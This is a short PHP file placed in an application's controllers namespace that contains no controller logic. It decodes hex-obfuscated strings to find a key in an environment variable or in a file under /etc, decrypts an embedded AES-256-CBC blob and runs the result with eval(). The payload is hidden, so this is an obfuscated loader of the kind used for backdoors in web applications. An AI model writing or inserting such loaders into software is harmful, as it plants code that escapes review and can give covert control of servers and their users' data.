<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('wxpQnmj1ecBFBwhJReWVHw==');

$c=base64_decode(

'1nvU4ocsKWcKkaEI8wROB7SbCQvyi3DlEQSwU5M81Jkqiuo5Z0k/O1SrJ9CGIQ923Q4OfzrMxrut' .
'AXARpdxy2aVUIqf6h69fBeWu2LqUz4nKqexnZ4brOcmlXEL8k5dDhKnyiJ+X0u/aoWhP7qmw07T5' .
'TOpSMZAvPhnzjPICre0Axth3ikuBFunpnSfFf2mlZJ5OuQPJ9raY/DxcKBCS7bJBBC8P+GEjLNew' .
'1TfzRm9riE6yz6qT8tvSdGuhTSgjpKHkPAhfLP9Kv19FB9sP4Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

